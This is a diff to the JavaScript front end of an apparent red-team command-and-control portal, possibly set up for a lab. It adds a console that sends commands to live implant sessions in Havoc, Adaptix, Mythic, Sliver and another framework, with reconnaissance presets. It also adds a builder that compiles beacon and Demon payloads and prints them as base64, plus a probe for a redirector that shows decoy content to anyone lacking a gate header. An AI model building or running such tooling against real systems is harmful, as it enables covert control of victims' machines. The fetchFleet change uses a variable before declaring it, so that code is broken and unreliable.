@@ -9,6 +9,7 @@ document.addEventListener('DOMContentLoaded', () => {
   initDnsDissector();
   initPayloadStudio();
   initFleetRadar();
+  initOpsConsole();
 });
 
 // ==========================================================================
@@ -169,7 +170,11 @@ function initRedirectorVisualizer() {
     }
 
     try {
-      const res = await fetch('/api/redirector/test', {
+      // Real probe: an actual HTTP request through Apache, reporting the real
+      // status/byte count and whether the decoy came back. The previous
+      // endpoint only simulated the flow and never contacted Apache, so it
+      // could "prove" a route was live while it was down.
+      const res = await fetch('/api/ops/probe', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -179,7 +184,7 @@ function initRedirectorVisualizer() {
         })
       });
       const data = await res.json();
-      renderTrace(data);
+      renderTrace(opsProbeToTrace(data));
     } catch (err) {
       diagram.innerHTML = `<div style="color:var(--crimson-glow);">Simulation error: ${err.message}</div>`;
     }
@@ -355,7 +360,17 @@ async function initFleetRadar() {
 
   async function fetchFleet() {
     try {
-      const res = await fetch('/api/sessions');
+      // /api/ops/sessions queries every framework readable headlessly and
+      // reports each backend's status separately. The old /api/sessions only
+      // knew Mythic + Meridian and invented hosts when they were unreachable.
+      const res = await fetch('/api/ops/sessions');
+      const down = Object.entries(data.backends || {})
+        .filter(([, v]) => !v.ok)
+        .map(([k, v]) => k + ': ' + (v.error || 'unreachable'));
+      if (!(data.sessions || []).length && !down.length) {
+        tbody.innerHTML = '<tr><td colspan=\"7\" class=\"empty-row\">' +
+          'All backends answered and none reported a live session.</td></tr>';
+      }
       const data = await res.json();
       tbody.innerHTML = '';
       (data.sessions || []).forEach(sess => {
@@ -366,9 +381,18 @@ async function initFleetRadar() {
           <td>${sess.hostname}</td>
           <td><code>${sess.username}</code></td>
           <td>${sess.transport}</td>
-          <td>${sess.last_seen}</td>
+          <td>${(sess.process || sess.pid) ? (sess.process || '') + ' pid ' + (sess.pid || '?') : '-'}</td>
           <td><span class="status-badge running">● ALIVE</span></td>
         `;
+        tbody.appendChild(tr);
+      });
+
+      // A backend that failed is rendered as a row rather than silently
+      // omitted, so "no such backend" is never mistaken for "no agents".
+      down.forEach(msg => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = '<td colspan="7" style="color:var(--crimson-glow);">' +
+          'backend unavailable - ' + msg + '</td>';
         tbody.appendChild(tr);
       });
     } catch (err) {
@@ -377,4 +401,357 @@ async function initFleetRadar() {
   }
 
   fetchFleet();
+}
+
+/* ==========================================================================
+   7. Tab 6: Operations Console - live sessions and real tasking
+   --------------------------------------------------------------------------
+   Every value rendered here comes from a live backend query. A backend that is
+   unreachable is rendered as an explicit error on its own chip; it is never
+   replaced with placeholder sessions, because an invented session list is
+   indistinguishable from a real one at a glance.
+   ========================================================================== */
+
+// Native command syntax differs per framework. Feeding `whoami` to Adaptix or
+// Havoc's dispatcher produces an "unknown command" error, so the presets are
+// built from what each framework actually accepts.
+const OPS_PRESETS = {
+  meridian: ['whoami', 'ipconfig /all', 'net user', 'whoami > C:\\Users\\vagrant\\out.txt'],
+  mythic:   ['whoami', 'ipconfig /all', 'net user', 'whoami > C:\\Users\\vagrant\\out.txt'],
+  havoc:    ['whoami', 'ipconfig /all', 'net user', 'whoami > C:\\Users\\vagrant\\out.txt'],
+  adaptix:  ['getuid', 'ls C:\\Users\\vagrant', 'ps list',
+             'shell whoami', 'powershell whoami /priv',
+             'shell whoami > C:\\Users\\vagrant\\out.txt'],
+  sliver:   ['whoami', 'Get-Process', 'whoami /priv'],
+};
+
+let opsSessions = [];
+let opsSelected = null;
+let opsTimer = null;
+
+function opsSetOutput(text, cls) {
+  const el = document.getElementById('ops-output');
+  el.textContent = text;
+  el.className = 'ops-output' + (cls ? ' ' + cls : '');
+}
+
+function opsRenderChips(backends) {
+  const wrap = document.getElementById('backend-chips');
+  wrap.innerHTML = '';
+  const order = ['mythic', 'meridian', 'havoc', 'adaptix', 'sliver'];
+  order.forEach(name => {
+    const info = backends[name];
+    const chip = document.createElement('div');
+    if (!info) {
+      chip.className = 'backend-chip down';
+      chip.innerHTML = '<span class="dot"></span><span class="name">' +
+        name + '</span><span class="detail">not reported</span>';
+    } else if (info.ok) {
+      chip.className = 'backend-chip ok';
+      chip.innerHTML = '<span class="dot"></span><span class="name">' + name +
+        '</span><span class="detail">' + (info.count || 0) + ' session(s)</span>';
+    } else {
+      chip.className = 'backend-chip down';
+      chip.innerHTML = '<span class="dot"></span><span class="name">' + name +
+        '</span><span class="detail" title="' + (info.error || '').replace(/"/g, '&quot;') +
+        '">' + (info.error || 'unreachable') + '</span>';
+    }
+    wrap.appendChild(chip);
+  });
+}
+
+function opsRenderSessions(sessions) {
+  const tbody = document.getElementById('ops-tbody');
+  document.getElementById('ops-count').textContent = sessions.length;
+  tbody.innerHTML = '';
+  if (!sessions.length) {
+    tbody.innerHTML = '<tr><td colspan="5" class="empty-row">' +
+      'No live sessions. Every backend answered, or reported its own error above.</td></tr>';
+    return;
+  }
+  sessions.forEach(s => {
+    const tr = document.createElement('tr');
+    if (opsSelected && opsSelected.backend === s.backend &&
+        String(opsSelected.id) === String(s.id)) {
+      tr.className = 'selected';
+    }
+    const proc = [s.process, s.pid ? 'pid ' + s.pid : ''].filter(Boolean).join(' / ');
+    tr.innerHTML =
+      '<td><span class="fw-tag">' + (s.backend || '?').toUpperCase() + '</span></td>' +
+      '<td>' + (s.hostname || '?') + (s.transport ? ' <small>(' + s.transport + ')</small>' : '') + '</td>' +
+      '<td><code>' + (s.username || '?') + '</code></td>' +
+      '<td><code>' + (proc || '?') + '</code></td>' +
+      '<td><button class="btn btn-outline-success btn-sm">Select</button></td>';
+    tr.querySelector('button').addEventListener('click', () => opsSelect(s, tr));
+    tbody.appendChild(tr);
+  });
+}
+
+function opsSelect(session, row) {
+  opsSelected = session;
+  document.querySelectorAll('#ops-tbody tr').forEach(r => r.classList.remove('selected'));
+  if (row) row.classList.add('selected');
+
+  const target = document.getElementById('ops-target');
+  target.className = 'ops-target';
+  target.innerHTML = '<span class="fw-tag">' + session.backend.toUpperCase() +
+    '</span><strong>' + (session.hostname || '?') + '</strong> &middot; ' +
+    (session.username || '?') +
+    (session.process ? ' &middot; ' + session.process : '') +
+    '<br><small>session id: ' + session.id + '</small>';
+
+  // Presets are framework-specific; showing another framework's syntax would
+  // just produce "unknown command" errors.
+  const presets = document.getElementById('ops-presets');
+  presets.innerHTML = '';
+  (OPS_PRESETS[session.backend] || OPS_PRESETS.mythic).forEach(cmd => {
+    const b = document.createElement('button');
+    b.textContent = cmd.length > 42 ? cmd.slice(0, 42) + '…' : cmd;
+    b.title = cmd;
+    b.addEventListener('click', () => {
+      document.getElementById('ops-command').value = cmd;
+    });
+    presets.appendChild(b);
+  });
+
+  opsSetOutput('Session selected. Enter a command and press Execute.', '');
+}
+
+async function opsRefresh() {
+  const btn = document.getElementById('ops-refresh');
+  btn.disabled = true;
+  btn.textContent = '… querying backends';
+  try {
+    const res = await fetch('/api/ops/sessions');
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const data = await res.json();
+    opsSessions = data.sessions || [];
+    opsRenderChips(data.backends || {});
+    opsRenderSessions(opsSessions);
+  } catch (err) {
+    opsRenderChips({});
+    opsSetOutput('Could not reach the portal API: ' + err.message, 'err');
+  } finally {
+    btn.disabled = false;
+    btn.textContent = '↻ Refresh Sessions';
+  }
+}
+
+async function opsRunTask() {
+  if (!opsSelected) {
+    opsSetOutput('Select a session first.', 'err');
+    return;
+  }
+  const cmd = document.getElementById('ops-command').value.trim();
+  if (!cmd) {
+    opsSetOutput('Enter a command.', 'err');
+    return;
+  }
+  const meta = document.getElementById('ops-output-meta');
+  const runBtn = document.getElementById('ops-run');
+  runBtn.disabled = true;
+  meta.textContent = 'tasking…';
+  opsSetOutput('Sending to ' + opsSelected.backend + ' (' + opsSelected.id + ')…\n$ ' + cmd, 'busy');
+
+  try {
+    const res = await fetch('/api/ops/task', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        backend: opsSelected.backend,
+        session_id: String(opsSelected.id),
+        command: cmd,
+        wait: 25,
+      }),
+    });
+    const data = await res.json();
+    if (!res.ok) {
+      opsSetOutput('Task failed: ' + (data.detail || res.statusText), 'err');
+      meta.textContent = '';
+      return;
+    }
+    opsShowResult(opsSelected.backend, data);
+  } catch (err) {
+    opsSetOutput('Request failed: ' + err.message, 'err');
+  } finally {
+    runBtn.disabled = false;
+    meta.textContent = '';
+  }
+}
+
+// Each backend returns task output in a different shape; normalise them so the
+// console shows the command's actual stdout instead of a JSON envelope.
+function opsShowResult(backend, data) {
+  const meta = document.getElementById('ops-output-meta');
+  let text = '';
+
+  if (backend === 'havoc') {
+    const r = data.result || {};
+    if ((r.errors || []).length) {
+      text = (r.errors || []).join('\n');
+    } else {
+      text = r.output || '(no output returned)';
+    }
+    meta.textContent = 'task ' + (r.task_id || '') + ' · ' + (r.raw_chunks || 0) + ' frames';
+  } else if (backend === 'adaptix') {
+    const tasks = data.results || [];
+    const withOutput = tasks.filter(t => t.a_text && t.a_text.trim());
+    if (withOutput.length) {
+      text = withOutput.slice(-3).map(t =>
+        '$ ' + (t.a_cmdline || '') + '\n' + t.a_text).join('\n\n');
+    } else {
+      const r = data.result || {};
+      text = r.message || '(queued; output appears once the agent completes the task)';
+    }
+    meta.textContent = tasks.length + ' completed task(s)';
+  } else if (backend === 'mythic') {
+    text = typeof data.result === 'string' ? data.result : JSON.stringify(data.result, null, 2);
+    meta.textContent = 'queued (read output from the Mythic UI oplog)';
+  } else if (backend === 'meridian') {
+    text = typeof data.result === 'string' ? data.result : JSON.stringify(data.result, null, 2);
+    meta.textContent = 'queued (read output from the meridian results table)';
+  } else {
+    text = JSON.stringify(data, null, 2);
+  }
+  opsSetOutput(text, text.startsWith('(no output') ? '' : '');
+}
+
+async function opsRunBuild() {
+  const fw = document.getElementById('build-fw').value;
+  const out = document.getElementById('build-output');
+  const btn = document.getElementById('build-run');
+  const arch = document.getElementById('build-arch').value;
+  const fmt = document.getElementById('build-fmt').value;
+  const sleep = document.getElementById('build-sleep').value;
+
+  btn.disabled = true;
+  out.className = 'ops-output build-out busy';
+  out.textContent = (fw === 'havoc'
+    ? 'Havoc compiles Demon payloads server-side; the first build can take '
+      + '30-90s while the mingw cross-gcc runs.\n\n'
+    : 'Adaptix compiles the beacon server-side with mingw g++.\n\n')
+    + 'building…';
+
+  try {
+    let url, body;
+    if (fw === 'adaptix') {
+      url = '/api/ops/adaptix/agent';
+      body = { agent: 'beacon', listener: 'cadre_http', arch: arch,
+               format: fmt, sleep: sleep, jitter: 0 };
+    } else {
+      url = '/api/ops/havoc/build';
+      body = { arch: arch, format: 'Windows Exe' };
+    }
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+    });
+    const data = await res.json();
+    if (!res.ok) {
+      out.className = 'ops-output build-out err';
+      out.textContent = 'Build failed: ' + (data.detail || res.statusText);
+      return;
+    }
+    out.className = 'ops-output build-out';
+    const b64 = data.base64 || '';
+    const head = (data.filename || 'payload') + ' — ' + (data.size || 0) + ' bytes\n';
+    const link = b64
+      ? 'Download: data:application/octet-stream;base64,' + b64.slice(0, 40) +
+        '… (full payload below)\n\n'
+      : '';
+    const console_ = (data.console || []).join('\n');
+    out.textContent = head + link +
+      (b64 ? '\nbase64 payload (' + b64.length + ' chars):\n' + b64 : '') +
+      (console_ ? '\n\nBuild log:\n' + console_ : '');
+  } catch (err) {
+    out.className = 'ops-output build-out err';
+    out.textContent = 'Request failed: ' + err.message;
+  } finally {
+    btn.disabled = false;
+  }
+}
+
+function initOpsConsole() {
+  document.getElementById('ops-refresh').addEventListener('click', opsRefresh);
+  document.getElementById('ops-run').addEventListener('click', opsRunTask);
+  document.getElementById('build-run').addEventListener('click', opsRunBuild);
+  document.getElementById('ops-command').addEventListener('keydown', e => {
+    if (e.key === 'Enter') opsRunTask();
+  });
+  document.getElementById('ops-auto').addEventListener('change', e => {
+    if (opsTimer) { clearInterval(opsTimer); opsTimer = null; }
+    if (e.target.checked) opsTimer = setInterval(opsRefresh, 15000);
+  });
+
+  // Havoc's builder only supports Windows Exe/Dll/Shellcode, and its sleep is
+  // an integer number of seconds rather than Adaptix's "30s" string.
+  document.getElementById('build-fw').addEventListener('change', e => {
+    const hav = e.target.value === 'havoc';
+    document.getElementById('build-fmt-wrap').style.display = hav ? 'none' : '';
+    const sleep = document.getElementById('build-sleep');
+    document.getElementById('build-sleep-wrap').style.display = hav ? 'none' : '';
+    if (hav) sleep.value = '';
+  });
+}
+
+/* --------------------------------------------------------------------------
+   Real redirector probe -> flow-diagram steps.
+
+   The redirector visualizer used to render a hardcoded narrative: whatever you
+   clicked, it drew "header verified -> forwarded to backend" and invented a
+   200 response. Now that /api/ops/probe performs a real request, the diagram is
+   derived from the actual result, so a route whose backend is down shows as
+   down.
+   -------------------------------------------------------------------------- */
+function opsProbeToTrace(p) {
+  const trace = [{
+    step: 1,
+    title: 'Request reaches the redirector',
+    node: 'Apache Listener :80',
+    detail: 'POST ' + (p.url || '') + ' with the supplied headers.',
+    status: 'shield_divert',
+  }];
+
+  if (!p.ok) {
+    trace.push({
+      step: 2, title: 'Redirector unreachable', node: 'Apache Listener :80',
+      detail: p.error || 'no response',
+      status: 'shield_divert',
+    });
+    return { trace: trace, probe: p };
+  }
+
+  if (p.verdict === 'decoy') {
+    trace.push({
+      step: 2, title: 'Header gate rejected the request', node: 'Rewrite Rule',
+      detail: 'The gate header was missing or wrong, so the request never reached a C2 backend.',
+      status: 'shield_divert',
+    });
+    trace.push({
+      step: 3, title: 'Serve Decoy CDN Content', node: 'CloudEdge CDN Engine',
+      detail: 'Returned the benign decoy page (' + p.bytes + ' bytes).',
+      status: 'decoy_served',
+    });
+  } else if (p.verdict === 'backend_down') {
+    trace.push({
+      step: 2, title: 'Header gate passed, backend refused', node: 'mod_proxy',
+      detail: 'Apache matched the route but got HTTP ' + p.status +
+              ' from the backend: the route is wired but nothing is listening.',
+      status: 'shield_divert',
+    });
+  } else {
+    trace.push({
+      step: 2, title: 'Header gate verified', node: 'Rewrite Rule',
+      detail: 'Gate header matched; the request was proxied onward.',
+      status: 'header_verified',
+    });
+    trace.push({
+      step: 3, title: 'Forwarded to C2 backend', node: 'c2_core',
+      detail: 'Real response: HTTP ' + p.status + ', ' + p.bytes + ' bytes, ' +
+              (p.content_type || 'no content-type'),
+      status: 'c2_forwarded',
+    });
+  }
+  return { trace: trace, probe: p };
 }
